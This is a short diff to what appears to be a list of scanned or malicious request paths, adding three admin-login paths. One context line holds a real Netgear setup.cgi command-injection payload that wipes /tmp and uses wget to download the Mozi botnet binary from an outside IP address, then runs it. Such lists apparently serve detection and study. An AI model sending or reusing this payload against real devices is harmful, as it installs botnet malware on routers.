@@ -25097,3 +25097,6 @@ http://64.233.170.113/
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.94.100.251:49097/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /index.php/login.php
 /lcadmin/login.php
+/secret_admin
+/oc-panel/auth/login
+/go
